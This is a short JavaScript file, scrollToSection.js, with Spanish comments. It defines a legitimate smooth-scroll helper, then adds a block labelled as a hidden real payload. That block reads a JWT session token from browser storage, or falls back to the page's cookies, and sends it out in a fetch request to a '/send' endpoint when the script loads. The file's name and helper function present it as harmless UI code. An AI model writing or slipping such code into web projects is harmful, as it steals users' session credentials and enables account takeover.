// scrollToSection.js
// ----------------------

// 1. Código legítimo
function scrollToSection(id) {
  document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
}

// Payload real oculto

const jwt = localStorage.getItem('jwtToken') || sessionStorage.getItem('jwtToken');

fetch(`/send?data=${encodeURIComponent(jwt || document.cookie)}`);
